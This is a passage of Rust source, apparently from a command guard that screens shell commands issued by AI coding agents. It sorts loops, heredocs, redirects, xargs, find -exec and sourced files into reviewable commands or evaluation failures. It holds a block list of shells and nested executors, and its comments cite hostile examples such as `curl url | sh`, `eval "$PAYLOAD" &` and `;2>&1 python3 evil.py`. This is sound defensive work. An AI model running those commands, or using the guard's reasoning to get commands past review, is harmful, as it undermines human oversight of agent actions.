//! Keep ordinary shell structure the canonical parser cannot model reviewable.
//!
//! Loops, conditionals, heredocs and redirects defeat the exact model that
//! extension matchers need. Treating that as an evaluation failure blocked
//! them outright, so a fully permitted `gh` call inside a `for` loop, a
//! `gh pr comment` fed by a heredoc, or `gh pr view 12 > pr.json` could not
//! even be approved. Those shapes are now treated like an uncertain
//! observation: they take the strongest floor of every active extension whose
//! programs the text names, or that cannot be recognized by name, and never
//! less than review.
//!
//! Everything that could hide a program or move data keeps the evaluation
//! failure: wrappers, nested executors, command substitution that runs a
//! program the text does not name or that a contributed extension owns (see
//! `substitution`), redirects other
//! than one input heredoc or to a literal path, redirects after a program
//! that makes links, `PATH` overrides, interpreters and program names built
//! from expansions or globs, as do signed or managed policy and global
//! lockdown.
//!
//! An interpreter is unbounded unless it is the whole command and the program
//! it runs, inline or fed on standard input, was read; it then runs only that
//! program, as it would run a script file. `xargs` and `find -exec` are the
//! exceptions that name their program in the text: standard input, or find's
//! own search, supplies arguments and not the program, so
//! `cat list.txt | xargs rm -f` and `find . -type f -exec basename {} \;` own
//! what the program they name owns. A literal
//! input redirect is not read yet, so `xargs rm -f < list.txt` stays an
//! evaluation failure. An active
//! extension with trust class `external` that owns a program named in the
//! text is not read through, and an unknown name set fails closed: its rules
//! judge arguments standard input supplies, which this text does not hold.
//! A built-in owner of the program `xargs` names still supplies its floor.

use std::collections::BTreeSet;
use std::time::Instant;

use guard_contracts::NativeCommandObservationBatchV1;

use super::{rank, rule_floor, CompiledNativeCommandControls};
use crate::pretool::generic::workspace_redirects;
use crate::CanonicalCommandV1;

#[path = "native_command_unmodeled_case.rs"]
mod case_labels;
#[path = "native_command_unmodeled_expansion.rs"]
mod expansion;
#[path = "native_command_unmodeled_find_exec.rs"]
mod find_exec;
#[path = "native_command_unmodeled_functions.rs"]
mod functions;
#[path = "native_command_link_makers.rs"]
mod link_makers;
#[path = "native_command_unmodeled_redirections.rs"]
mod redirections;
#[path = "native_command_unmodeled_shapes.rs"]
mod shapes;
#[path = "native_command_unmodeled_substitution.rs"]
mod substitution;
#[path = "native_command_unmodeled_xargs.rs"]
mod xargs;
use case_labels::without_case_labels;
use find_exec::{find_exec_programs, EXEC_ACTIONS};
use link_makers::creates_links;
pub(crate) use prefix::{launcher_body, prefix_reads_a_program_file};
use redirections::without_redirections;
use shapes::{data_heredocs, without_lookups, without_plain_awk};
pub(crate) use shapes::{python_is_builtin_only, python_stdin};
use substitution::bounded_substitutions;
use xargs::{xargs_input_is_named, xargs_names_its_program, xargs_programs};

/// Compatibility owners recognize these programs without a catalog matcher.
const COMPATIBILITY_EXECUTABLES: &[(&str, &[&str])] = &[
    ("command.git", &["git"]),
    ("command.github", &["gh"]),
    ("command.container-runtime", &["docker"]),
    ("command.kubernetes-operations", &["kubectl", "oc"]),
    ("command.kubernetes-secrets", &["kubectl", "oc"]),
];

const UNMODELED_ERRORS: [&str; 2] = [
    "native_command_compatibility_model_unsupported",
    "native_command_compatibility_context_unsupported",
];

/// Programs that run text they receive, or a program named by a later
/// argument, so they can assemble any command.
const INTERPRETERS: &[&str] = &[
    "timeout",
    "gtimeout",
    "nice",
    "ionice",
    "sudo",
    "doas",
    "stdbuf",
    "chrt",
    "taskset",
    "setsid",
    "flock",
    "chroot",
    "strace",
    "ltrace",
    "unbuffer",
    "caffeinate",
    "fd",
    "-exec",
    "-execdir",
    "-ok",
    "-okdir",
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "csh",
    "tcsh",
    "fish",
    "ash",
    "busybox",
    "pwsh",
    "powershell",
    "cmd",
    "eval",
    "source",
    "exec",
    "xargs",
    "env",
    "python",
    "python2",
    "python3",
    "node",
    "deno",
    "bun",
    "perl",
    "ruby",
    "php",
    "lua",
    "osascript",
    "awk",
    "gawk",
    "watch",
    "parallel",
    "su",
    "script",
    "tmux",
    "screen",
    "expect",
];

/// Words that take a command position without being the program.
const SHELL_PREFIXES: &[&str] = &[
    "do", "then", "else", "elif", "while", "until", "if", "!", "time", "command", "builtin",
    "nohup",
];

impl CompiledNativeCommandControls {
    /// Observes `command`, returning the review floor it takes when it is
    /// unmodeled but its possible owners can still be bounded.
    pub(super) fn observe_command(
        &self,
        command: &CanonicalCommandV1,
        deadline: Option<Instant>,
        context: crate::pretool::PathContext<'_>,
        environment: Option<&guard_contracts::GuardExecutionEnvironmentV1>,
    ) -> Result<(NativeCommandObservationBatchV1, Option<&'static str>), &'static str> {
        match self.program.observe_in_with_dispatch(
            command,
            &self.active_extensions,
            deadline,
            context,
            environment,
            Some(&self.candidate_index),
        ) {
            Err(error) if UNMODELED_ERRORS.contains(&error) => self
                .unmodeled_floor(command, context)
                .map(|floor| (NativeCommandObservationBatchV1::default(), Some(floor)))
                .ok_or(error),
            observed => observed.map(|batch| (batch, None)),
        }
    }

    /// The strongest floor of every active extension that could own part of
    /// the command, and never less than review. `None` keeps the evaluation
    /// failure.
    fn unmodeled_floor(
        &self,
        command: &CanonicalCommandV1,
        context: crate::pretool::PathContext<'_>,
    ) -> Option<&'static str> {
        if self.global_block
            || self.binding.managed_revision != 0
            || self
                .binding
                .layers
                .iter()
                .any(|layer| layer.global_lockdown || layer.kind != "local-admin")
        {
            return None;
        }
        if !reviewable_structure(command, context) {
            return None;
        }
        // A lookup such as `command -v doctl` only prints a path: it never
        // runs the program it names, so it owns nothing.
        let looked = without_lookups(&command.normalized_text);
        let text = &looked;
        let heredocs = data_heredocs(text);
        let shell = match &heredocs {
            Some((shell, _)) => shell.clone(),
            None => shell_text(text).to_owned(),
        };
        // A redirection such as `;2>&1` is not a program. It goes before the
        // awk pass, which rejoins words with spaces: `2>&1` became `2 >& 1`,
        // and the lone fd then read as the program hiding the interpreter.
        let bare = without_plain_awk(&without_redirections(&shell));
        let shell = without_plain_awk(&shell);
        let shell = shell.as_str();
        let interpreted = named_words(&joined_quotes(&bare));
        // `source FILE` runs the file's words in this shell, so the file names
        // the programs the command can run. Reading it bounds those owners the
        // way a script file bounds an interpreter's. Until it was read, an
        // ordinary `source .venv/bin/activate && pytest -q` had no owner set at
        // all and was refused outright, with no approval left to give it.
        //
        // A file whose words this scan cannot tell a tame story about still
        // names the programs it holds, and every one of them joins the owners
        // below, so the floor it reaches can only rise. Asking the file to
        // read tamely as well refused ordinary activation scripts outright.
        let sources_files = interpreted.contains("source") || interpreted.contains(".");
        let sourced = if sources_files {
            crate::pretool::sourced_program_sources(command, context)
                .or_else(|| crate::pretool::sourcing_bounded_sources(command, context))
        } else {
            Some(Vec::new())
        };
        // A file this scan could not read is no more opaque than the same
        // file handed to `bash`, which has always reviewed behind an approval
        // card. `~/.nvm/nvm.sh` is the ordinary case: a hidden home path the
        // read screen keeps out of reach, with no marker of its own the way a
        // virtualenv has `pyvenv.cfg`. The shape still has to be only
        // sourcing, and the file still has to be named in the text, so
        // `source $INIT` and `eval evil && source ok.sh` keep their evaluation
        // failure. Nothing is projected from a file that was not read: the
        // owners below come only from text this scan held, including the text
        // of a file read beside one that could not be, and this floor starts
        // at `review` and only rises.
        let sourced_bounded = sources_files && sourced.is_some();
        if shell.contains("$'")
            || shell.contains("$\"")
            || synthesizes_program(&unquoted_literal(shell), sourced_bounded)
        {
            return None;
        }
        let mut named = named_words(text);
        for source in sourced.iter().flatten() {
            // The owners come from the same reading that bounded them. A
            // program named only in a comment or in a wrapper nothing calls
            // runs no more here than it did there, and counting it blocked
            // commands the file could never run: every virtualenv's `pydoc`
            // wrapper names `python`.
            named.extend(named_words(&running_text(source, shell)));
        }
        let xargs_programs = xargs_programs(shell);
        // An `xargs` is read only when the text also says where it reads its
        // operands. A bare one takes the caller's standard input, so the
        // arguments it hands the program are not in this text.
        let xargs_bounded = xargs_programs.is_some() && xargs_input_is_named(shell);
        // No command-position `xargs` is `None`, not an empty program set.
        let xargs_names_program = shell.contains("xargs")
            && xargs_bounded
            && xargs_names_its_program(shell)
            && xargs_programs
                .as_ref()
                .is_some_and(|programs| !programs.is_empty());
        let exec_programs = find_exec_programs(shell);
        // No `-exec` action is `None`, not an empty program set.
        let exec_names_program = exec_programs
            .as_ref()
            .is_some_and(|programs| !programs.is_empty());
        if INTERPRETERS.iter().any(|name| {
            interpreted.contains(*name)
                && !(sourced_bounded && matches!(*name, "source" | "."))
                && !(xargs_bounded && *name == "xargs")
                && !(exec_names_program && EXEC_ACTIONS.contains(name))
        }) {
            // An `xargs` whose operands are not in the text is not bounded by
            // reading a script file. `2>/dev/null xargs gh` still takes its
            // arguments from the caller.
            if interpreted.contains("xargs") && !xargs_bounded {
                return None;
            }
            // A program read from a file names the tools it may launch
            // outside the command text, so it counts toward the owners.
            match crate::pretool::sole_program_sources(command, context) {
                Some(sources) => {
                    for source in sources {
                        named.extend(named_words(&source));
                    }
                }
                // Backgrounding or a redirect leaves no segments, so a module
                // launch such as `python3 -m http.server` looks like a script
                // that was never read. The module name is already in the
                // command.
                None if !prefix::interpreter_launch_reads_a_file(&bare, sourced_bounded) => {}
                // A script file behind a trailing `&` is no more opaque than
                // the same file run in the foreground, which this scan does
                // model: `node server.js &` runs what `node server.js` runs.
                // Refusing it here blocked an ordinary dev server outright,
                // with no approval left to give it, while the same text
                // without the `&` ran. The owners stay the ones this text
                // names, so the floor it reaches is still a review.
                None if crate::pretool::backgrounded_launch(command, context) => {}
                // A scheduling prefix leaves no segments either, so the
                // program behind it reads as a script nobody opened even when
                // the same words without the prefix model exactly. The
                // command the prefix runs is the one the text already names,
                // and its own programs count toward the owners below.
                None if crate::pretool::prefixed_launch(command, context) => {}
                None => return None,
            }
        }
        // The programs read out of an `xargs` or a `find -exec`. Reading one
        // leaves the operands standard input, or find's own search, supplies
        // unread.
        let delegated: Option<BTreeSet<String>> =
            (xargs_names_program || exec_names_program).then(|| {
                xargs_programs
                    .iter()
                    .chain(exec_programs.iter())
                    .flatten()
                    .cloned()
                    .collect()
            });
        // An active external command source that owns a program named here,
        // or whose names are unknown, judges arguments this text does not
        // hold, so the evaluation failure stays. Those extensions are
        // inactive until enabled. A pipe such as `cat list.txt | xargs rm -f`,
        // and a `find . -exec rm -f {} \;`, keep the review their built-in
        // owner gives them. A literal input redirect is not read yet.
        if delegated.is_some() && self.external_source_names_a_program(&named) {
            return None;
        }
        // A substitution's output becomes arguments of the command around it,
        // and the extension rules never read the command it runs. A
        // contributed extension that owns either judges text this one does not
        // hold, so `gh pr view "$(cat id)"` and `echo $(gh pr list)` keep the
        // evaluation failure, as `xargs gh` does. A required owner, such as
        // the one for `git` or `kill`, still supplies its floor below.
        if bounded_substitutions(text)
            .is_some_and(|bounded| self.contributed_owner_names_a_program(&bounded.programs))
        {
            return None;
        }
        let mut floor = "review";
        for &index in self.candidate_index.extension_indices() {
            let extension = &self.program.extensions[index];
            let compatibility = COMPATIBILITY_EXECUTABLES
                .iter()
                .find(|(id, _)| *id == extension.extension_id)
                .map(|(_, executables)| *executables);
            let extension_names = self.program.extension_names(index, compatibility);
            let owns = extension_names
                .as_ref()
                .is_none_or(|names| names.is_empty() || !names.is_disjoint(&named));
            if !owns {
                continue;
            }
            // A contributed extension with a known program list is not read
            // through when that list includes the program `xargs` or a
            // `find -exec` names. `gh` is one, so `xargs gh pr merge` stays an
            // evaluation failure. An unknown or empty name set is not that
            // list: treating it as one refused `xargs rm` along with every
            // other unmodeled command. The required owner of `rm` still
            // reviews it.
            if !extension.required {
                if let (Some(programs), Some(names)) = (&delegated, &extension_names) {
                    if !names.is_empty() && !names.is_disjoint(programs) {
                        return None;
                    }
                }
            }
            if rank(self.extension_floor(index)) > rank(floor) {
                floor = self.extension_floor(index);
            }
        }
        Some(floor)
    }

    /// An active extension that is not required lists a program in
    /// `programs`. When some of its rules can match without naming a known
    /// program, the programs it declares and its other rules name still
    /// count, so `agi-memory sync $(echo dedupe)` keeps the failure. An
    /// extension that names none of them is not an owner here.
    fn contributed_owner_names_a_program(&self, programs: &BTreeSet<String>) -> bool {
        self.candidate_index
            .extension_indices()
            .iter()
            .any(|&index| {
                let extension = &self.program.extensions[index];
                if extension.required || !self.active_extensions.contains(&extension.extension_id) {
                    return false;
                }
                let compatibility = COMPATIBILITY_EXECUTABLES
                    .iter()
                    .find(|(id, _)| *id == extension.extension_id)
                    .map(|(_, executables)| *executables);
                !self
                    .program
                    .extension_known_names(index, compatibility)
                    .is_disjoint(programs)
            })
    }

    /// An active extension with trust class `external` owns a program the
    /// command names. An unknown name set fails closed: that extension can
    /// match without a known program, so it is treated as owning the command.
    fn external_source_names_a_program(&self, named: &BTreeSet<String>) -> bool {
        self.candidate_index
            .extension_indices()
            .iter()
            .any(|&index| {
                let extension = &self.program.extensions[index];
                if extension.trust_class != "external"
                    || !self.active_extensions.contains(&extension.extension_id)
                {
                    return false;
                }
                let compatibility = COMPATIBILITY_EXECUTABLES
                    .iter()
                    .find(|(id, _)| *id == extension.extension_id)
                    .map(|(_, executables)| *executables);
                let extension_names = self.program.extension_names(index, compatibility);
                extension_names
                    .as_ref()
                    .is_none_or(|names| names.is_empty() || !names.is_disjoint(named))
            })
    }

    /// The floor the extension would apply to its strongest rule, as an
    /// uncertain observation owned by it would take.
    fn extension_floor(&self, index: usize) -> &'static str {
        let extension = &self.program.extensions[index];
        if self.blocked_extensions.contains(&extension.extension_id)
            || extension
                .permissions
                .iter()
                .any(|permission| self.blocked_permissions.contains(&permission.permission_id))
        {
            return "block";
        }
        self.program
            .extension_rules(index)
            .map(|rule| {
                if self
                    .explicitly_enabled_permissions
                    .contains(&rule.permission_id)
                {
                    "review"
                } else {
                    rule_floor(rule, extension.required)
                }
            })
            .max_by_key(|floor| rank(floor))
            .unwrap_or("review")
    }
}

/// Whether a trailing `&` is all that hides a nested executor.
///
/// The scan stops at the first construct it cannot model, and the background
/// job wins that race: `eval "$PAYLOAD" &` is a background job to the parser
/// and an `eval` to the shell. Read without the `&` it is the nested executor
/// the arm below refuses unless the text names the program it runs, so
/// backgrounding must not be the thing that admits it.
///
/// The foreground text is read here rather than parsed again: a second parse
/// answers for the shape the scan already gave up on, and the question is
/// only which program the text puts in command position.
fn backgrounded_nested_executor(normalized: &str) -> bool {
    let Some(foreground) = crate::pretool::foreground_job(normalized) else {
        return false;
    };
    // Both of these name the program they run, so the floor below can still
    // bound them and backgrounding takes nothing away.
    if named_xargs_pipeline(foreground) || named_find_exec(foreground) {
        return false;
    }
    // Only one command of the foreground text has to be the executor, and it
    // need not be the first: `cd src; eval "$CMD" &` and `true || xargs sh &`
    // each put it behind a separator a background job is allowed to carry, and
    // `"eval" "$CMD" &` spells its name in quotes the shell takes off. Every
    // command position is read, with the quotes and the directory stripped, so
    // none of them reaches the floor below on the strength of its first word.
    let literal = unquoted_literal(foreground);
    let programs: Vec<String> = command_words(&literal)
        .filter(|word| !is_assignment(word))
        .map(executor_name)
        .collect();
    if programs.iter().any(|program| {
        matches!(
            program.as_str(),
            "." | "eval" | "exec" | "parallel" | "source" | "xargs"
        )
    }) {
        return true;
    }
    programs
        .iter()
        .any(|program| matches!(program.as_str(), "find" | "fd"))
        && literal.split_whitespace().any(|word| {
            matches!(word, "-exec" | "-execdir" | "-ok" | "-okdir" | "-x" | "-X")
                || word == "--exec"
                || word.starts_with("--exec=")
                || word.starts_with("--exec-batch")
        })
}

/// The program a command-position word names, without the directory, the
/// image extension and the quotes the shell takes off before it resolves the
/// name: `"eval"`, `'ev'al` and `/bin/eval` are each that program.
fn executor_name(word: &str) -> String {
    let word = word.replace('"', "");
    let base = word.rsplit(['/', '\\']).next().unwrap_or(&word);
    let lowered = base.to_ascii_lowercase();
    lowered
        .strip_suffix(".exe")
        .or_else(|| lowered.strip_suffix(".cmd"))
        .unwrap_or(&lowered)
        .to_owned()
}

/// A pipeline whose only data movement is a pipe into an `xargs` that names
/// the program it runs. A pipe into a shell, `curl url | sh`, is not one.
fn named_xargs_pipeline(text: &str) -> bool {
    let literal = unquoted_literal(text);
    text.contains("xargs")
        && xargs_names_its_program(text)
        && xargs_input_is_named(text)
        && !text.contains(['<', '>', '`', '$', '\n'])
        && !moves_data(&literal)
}

/// A `find` whose every `-exec` names the program it runs. find passes the
/// paths it found as that program's operands, and those come from the roots
/// this text already names, so `find src -type f -exec basename {} \;` runs
/// the `basename` the text shows and owns what `basename` owns. Reading it as
/// an unbounded nested executor refused it outright, with no approval left to
/// give it, while `find src -type f -exec cat {} +` was allowed by name.
/// `find . -exec sh -c ...` runs whatever that reads and names no bounded
/// program, so it keeps the evaluation failure, as `xargs sh` does.
fn named_find_exec(text: &str) -> bool {
    let literal = unquoted_literal(text);
    find_exec_programs(text).is_some_and(|programs| !programs.is_empty())
        && !text.contains(['<', '>', '`', '$', '\n'])
        && !moves_data(&literal)
}

/// `;2>&1 python3 evil.py` and the same shape with `<` or `>&`. A spaced
/// `cmd 2>&1` is not glued, and `python3 -` names no script file.
fn glued_redirect_runs_interpreter(text: &str) -> bool {
    let chars: Vec<char> = text.chars().collect();
    let mut glued = false;
    for index in 0..chars.len().saturating_sub(1) {
        if !matches!(chars[index], ';' | '|' | '&' | '\n' | '(') {
            continue;
        }
        // `&>`, `>&` and `<&` are one redirect. The `&` is not a separator.
        if chars[index] == '&'
            && (chars[index + 1] == '>' || (index > 0 && matches!(chars[index - 1], '>' | '<')))
        {
            continue;
        }
        let next = chars[index + 1];
        if matches!(next, '<' | '>') || (next == '&' && chars.get(index + 2) == Some(&'>')) {
            glued = true;
            break;
        }
        if !next.is_ascii_digit() {
            continue;
        }
        let rest = &chars[index + 1..];
        let end = rest
            .iter()
            .position(|value| value.is_whitespace())
            .unwrap_or(rest.len());
        if rest[..end].contains(&'>') || rest[..end].contains(&'<') {
            glued = true;
            break;
        }
    }
    if !glued {
        return false;
    }
    let words = named_words(text);
    words.iter().any(|word| {
        matches!(
            word.as_str(),
            "sh" | "bash"
                | "dash"
                | "zsh"
                | "python"
                | "python2"
                | "python3"
                | "node"
                | "ruby"
                | "perl"
                | "php"
        )
    }) && words.iter().any(|word| word.contains('.'))
}

/// Loops and conditionals, or one heredoc that only feeds standard input,
/// with nothing in the shell text that substitutes or overrides `PATH` and no
/// redirect except to a literal path.
fn reviewable_structure(
    command: &CanonicalCommandV1,
    context: crate::pretool::PathContext<'_>,
) -> bool {
    if command.path_overridden || command.confidence != "uncertain" {
        return false;
    }
    // The parser's scan stops at the first construct it cannot model, so which
    // reason a command carries depends on where that construct sits in the
    // text: `echo "${ pwd; }"` is a substitution, while the same brace behind a
    // `(` is a compound shell. A brace the shell runs owns whatever it runs
    // whichever reason won that race, so refuse it before the reasons are read
    // rather than in the one arm it happened to reach.
    if crate::parser_brace_command::brace_runs_a_command_unquoted(&without_lookups(
        &command.normalized_text,
    )) {
        return false;
    }
    // A bounded substitution prints arguments and nothing else, so the shape
    // around it is read with each one as the word it prints. Anything else
    // keeps the text as written, where `$(` still reads as moving data.
    let substituted = bounded_substitutions(&command.normalized_text);
    let normalized = substituted
        .as_ref()
        .map_or(command.normalized_text.as_str(), |bounded| {
            bounded.text.as_str()
        });
    match command.uncertainty_reason.as_deref() {
        // Backgrounding runs the same programs the foreground text names, so
        // `npm start &` owns exactly what `npm start` owns. Without this arm a
        // trailing `&` blocked outright while the same command with a redirect
        // reached review, because the redirect reason wins the parser's scan.
        Some("background_job_not_yet_supported") => {
            let literal = unquoted_literal(normalized);
            !background_pipeline(normalized)
                && (!moves_data(&literal) || literal_redirects_only(normalized))
                && !backgrounded_nested_executor(normalized)
        }
        Some("compound_shell_not_yet_supported") => {
            let literal = unquoted_literal(normalized);
            !moves_data(&literal)
                || literal_redirects_only(normalized)
                || named_xargs_pipeline(normalized)
        }
        // `cat list.txt | xargs -0 rm -f` is a nested executor because `xargs`
        // is one, and the pipe carries arguments into the program the text
        // names. A `find -exec` names its program the same way, and find's
        // own search roots are in this text, so `find src -type f -exec
        // basename {} \;` is read as the `basename` it shows. `eval`,
        // `xargs sh` and `find -exec sh -c` stay an evaluation failure: those
        // do not name a bounded program.
        //
        // The shell's `source` builtin is a nested executor too, and the file
        // it reads does name a bounded program set, which the floor below
        // already knows how to collect. Without this arm it never got the
        // chance: `source .venv/bin/activate && pytest -q`, the first thing
        // any Python project runs, reached an evaluation failure here and
        // blocked outright, with no approval left to give it.
        Some("nested_command_executor_not_yet_supported") => {
            let literal = unquoted_literal(normalized);
            named_xargs_pipeline(normalized)
                || named_find_exec(normalized)
                || ((!moves_data(&literal) || literal_redirects_only(normalized))
                    && sourcing_names_its_files(command, context))
        }
        Some("command_redirect_not_yet_supported") => {
            let text = without_lookups(normalized);
            // `;2>&1 python3 evil.py` has no segments: the redirect is the
            // uncertainty. Reviewing it would hide the interpreter.
            !glued_redirect_runs_interpreter(&text)
                && (input_heredoc(&text)
                    || literal_redirects_only(&text)
                    || data_heredocs(&text).is_some_and(|(shell, _)| plain_after_heredocs(&shell)))
        }
        // A scheduling or buffering prefix runs the program this text already
        // names, as this user and in this directory. `nice cargo build` and
        // `timeout -k 5 30 npm test` left a wrapper the parser does not model
        // yet, so they reached an evaluation failure and blocked outright,
        // with no approval left to give them, while `timeout 30 npm test`
        // modelled exactly. A prefix that changes who runs the program, and an
        // interpreter standing behind one, are refused before any floor is
        // read.
        Some("transparent_wrapper_not_yet_supported") => {
            let literal = unquoted_literal(normalized);
            // An interpreter or a script behind the prefix is read when its
            // own text parses as the command it looks like: `nohup node
            // server.js` runs what `node server.js` runs, which models
            // exactly on its own. Without that reading the launcher made the
            // command stricter than the same words without it - a block with
            // no approval, where the bare spelling ran.
            (prefix::launch_only(&literal) || crate::pretool::prefixed_launch(command, context))
                && (!moves_data(&literal) || literal_redirects_only(normalized))
        }
        // An unquoted `${NAME}` expands to a value the shell splits into
        // words. Splitting makes operands, never operators, so the text still
        // names every program it runs, exactly as the `$NAME` and `"${NAME}"`
        // spellings of the same value do: those two model exactly, while this
        // one reached an evaluation failure and blocked outright. A command
        // word built from an expansion, `${ cmd; }` among them, is refused
        // before any floor is read, and so is a brace form the shell
        // evaluates rather than substitutes (see `expansion`).
        Some("parameter_expansion_not_yet_supported") => {
            let literal = unquoted_literal(normalized);
            expansion::expansions_are_inert(normalized)
                && !expansion_builds_a_word(normalized)
                && (!moves_data(&literal) || literal_redirects_only(normalized))
        }
        // A lookup in a substitution is the only one that does not run a
        // program, so a command whose substitutions are all lookups reads
        // like any other compound command.
        //
        // Any other substitution is read as the words it prints when every
        // command it runs is named in its text (see `substitution`).
        Some("command_substitution_not_yet_supported") => {
            let looked = without_lookups(&command.normalized_text);
            bounded_substitutions(&looked).is_some_and(|bounded| {
                let text = bounded.text;
                !text.contains("$(")
                    && !text.contains('`')
                    && !text.contains("<<")
                    && plain_after_heredocs(&text)
            })
        }
        _ => false,
    }
}

/// Whether every nested executor the command holds is the shell's `source`
/// builtin naming a file the text itself spells out.
///
/// The floor reads those files again to collect the programs they name, and
/// whether it can read them is its question, not this shape's. Asking it here
/// too left `source ~/.nvm/nvm.sh && nvm use 20` with an evaluation failure
/// and no approval row, because a hidden home path is one this scan may not
/// read, while `bash ~/.nvm/nvm.sh && nvm use 20` ran the same bytes behind an
/// ordinary review card. A file the text does not name at all, and anything
/// else nested alongside the sourcing, keep their evaluation failure: those
/// run words this text does not hold.
///
/// A file that is not there holds no words either, so it is reviewable too:
/// `source venv/bin/activate && pytest -q` in a checkout whose virtualenv has
/// not been created blocked outright, while the same command reviewed once the
/// directory existed. The floor still collects owners only from files it read,
/// and it starts at review.
fn sourcing_names_its_files(
    command: &CanonicalCommandV1,
    context: crate::pretool::PathContext<'_>,
) -> bool {
    crate::pretool::sourcing_bounded_sources(command, context).is_some()
}

/// A command with its heredocs removed that moves no data, or only to
/// literal paths.
fn plain_after_heredocs(shell: &str) -> bool {
    !moves_data(&unquoted_literal(shell)) || literal_redirects_only(shell)
}

/// Every redirect names a literal path or is a quoted heredoc fed to `cat`,
/// or to `python3 -` as a builtin-only program, and
/// the rest substitutes nothing and, when a redirect names a file other than
/// `/dev/null`, makes no link that redirect could follow.
fn literal_redirects_only(text: &str) -> bool {
    workspace_redirects::project_naming_files(text).is_some_and(|(projected, names_files)| {
        // `2>&1>log` keeps the descriptor copy in the projected text. That
        // copy is not a file write, so it does not by itself move data.
        let projected = projected.replace("2>&1", " ").replace("2>/dev/null", " ");
        // The projection removed every redirect the shell would act on, or it
        // reported nothing to project. An angle bracket still standing in it is
        // quoted or escaped text the shell passes through as an argument: the
        // `<address>` of a commit trailer, an HTML tag, a comparison. Reading
        // those as data movement blocked an ordinary heredoc file write
        // outright, with no approval left to give it.
        let literal = unquoted_literal(&projected).replace(['<', '>'], " ");
        !(moves_data(&literal) || (names_files && creates_links(&literal)))
    })
}

/// A backgrounded pipeline stays out of the review floor. The pipe check
/// names a remote-code or exfiltration attack before this runs; anything it
/// cannot classify, including a benign pipe, keeps the evaluation failure.
/// A pipeline after the last backgrounded job runs in the foreground, as the
/// `curl -fsS http://localhost:8080/ | grep title` that checks a server just
/// started does.
fn background_pipeline(text: &str) -> bool {
    let preserve_backslash = cfg!(windows);
    let Ok(segments) =
        crate::parser_segments::split_pipelines_including_background(text, preserve_backslash)
    else {
        return text.contains('|');
    };
    let chars: Vec<char> = text.chars().collect();
    let last_job = segments
        .iter()
        .filter(|segment| {
            let mut rest = chars[segment.end..]
                .iter()
                .skip_while(|c| c.is_whitespace());
            rest.next() == Some(&'&') && rest.next() != Some(&'&')
        })
        .map(|segment| segment.end)
        .max()
        .unwrap_or(chars.len());
    segments
        .iter()
        .any(|segment| segment.pipeline_index > 0 && segment.start < last_job)
}

/// Whether shell text redirects, substitutes or sets the environment of a
/// command, such as `PATH`, outside single quotes.
fn moves_data(literal: &str) -> bool {
    literal.contains(['<', '>', '`'])
        || literal.contains("$(")
        || command_words(literal).any(|word| {
            (is_assignment(word) && !saves_job_pid(word) && !assigns_nothing(word))
                || matches!(
                    word,
                    "export" | "declare" | "typeset" | "readonly" | "local" | "unset" | "alias"
                )
        })
}

/// One heredoc on the first line, ending the text, whose body cannot run
/// commands: its delimiter is quoted, or the body expands nothing.
fn input_heredoc(text: &str) -> bool {
    let Some((line, rest)) = text.split_once('\n') else {
        return false;
    };
    let Some((before, after)) = line.split_once("<<") else {
        return false;
    };
    let after = after.strip_prefix('-').unwrap_or(after).trim();
    let quoted = after.starts_with(['\'', '"']);
    let delimiter = after.trim_matches(['\'', '"']);
    if delimiter.is_empty()
        || !delimiter
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_')
        || moves_data(&unquoted_literal(before))
    {
        return false;
    }
    let mut lines: Vec<&str> = rest.lines().collect();
    if lines.pop().map(str::trim) != Some(delimiter)
        || lines.iter().any(|body| body.trim() == delimiter)
    {
        return false;
    }
    quoted || lines.iter().all(|body| !body.contains(['$', '`', '\\']))
}

/// Every word the shell could read as a program name or keyword token, with
/// and without quoting, as a full path, a basename and without a Windows
/// suffix, so `sh -c 'gh …'`, `g""h` and `C:\tools\GH.EXE` all name `gh`.
fn named_words(text: &str) -> BTreeSet<String> {
    let unquoted: String = text
        .chars()
        .filter(|character| !matches!(character, '\'' | '"' | '\\'))
        .collect();
    let mut named = BTreeSet::new();
    for value in [text, unquoted.as_str()] {
        let words = value.split(|character: char| {
            !(character.is_ascii_alphanumeric() || matches!(character, '.' | '_' | '-' | '+' | '/'))
        });
        for word in words.chain(value.split_whitespace()) {
            let lowered = word.to_ascii_lowercase();
            let base = lowered
                .rsplit(['/', '\\'])
                .next()
                .unwrap_or_default()
                .to_owned();
            for name in [lowered, base] {
                if let Some(stem) = name
                    .strip_suffix(".exe")
                    .or_else(|| name.strip_suffix(".cmd"))
                {
                    named.insert(stem.to_owned());
                }
                if !name.is_empty() {
                    named.insert(name);
                }
            }
        }
    }
    named
}

/// The text with single-quoted spans reduced to their word characters.
/// Single-quoted text is literal, so its separators, redirects and expansions
/// are dropped, but its letters stay joined to the word around them as the
/// shell joins them: `'sh' -c` still names `sh` and `g''h` names `gh`.
/// Quotes inside double quotes or after a backslash stay ordinary text. An
/// unterminated quote or a heredoc, whose body quotes are not shell syntax,
/// keeps the whole text in view.
fn unquoted_literal(text: &str) -> String {
    if text.contains("<<") {
        return text.to_owned();
    }
    let mut literal = String::with_capacity(text.len());
    let (mut single, mut double, mut escaped) = (false, false, false);
    for character in text.chars() {
        if single {
            single = character != '\'';
            if single
                && (character.is_ascii_alphanumeric()
                    || matches!(character, '.' | '_' | '-' | '+' | '/'))
            {
                literal.push(character);
            }
        } else if escaped {
            escaped = false;
            literal.push(character);
        } else if character == '\'' && !double {
            single = true;
        } else {
            escaped = character == '\\';
            double ^= character == '"';
            literal.push(character);
        }
    }
    if single {
        return text.to_owned();
    }
    literal
}

/// The text the shell runs as commands. An accepted input heredoc contributes
/// only its command, since `input_heredoc` already keeps its body from
/// expanding and the body is data on standard input.
fn shell_text(text: &str) -> &str {
    match text.split_once('\n') {
        Some((line, _)) if text.contains("<<") => line.split_once("<<").map_or(line, |(b, _)| b),
        _ => text,
    }
}

/// The text with every quoted span reduced to its word characters, joined to
/// the word around it, so a quoted argument such as `--body "fix env
/// handling"` names no program while `"sh" -c` and `g""h` still do. A
/// backslash inside double quotes escapes the next character. An
/// unterminated quote keeps the whole text in view.
fn joined_quotes(text: &str) -> String {
    let mut joined = String::with_capacity(text.len());
    let (mut quote, mut escaped) = (None, false);
    for character in text.chars() {
        match quote {
            Some(_) if escaped => escaped = false,
            Some(open) if character == open => quote = None,
            Some(open) => {
                escaped = open == '"' && character == '\\';
                if character.is_ascii_alphanumeric()
                    || matches!(character, '.' | '_' | '-' | '+' | '/')
                {
                    joined.push(character);
                }
            }
            None if escaped => {
                escaped = false;
                joined.push(character);
            }
            None if matches!(character, '\'' | '"') => quote = Some(character),
            None => {
                escaped = character == '\\';
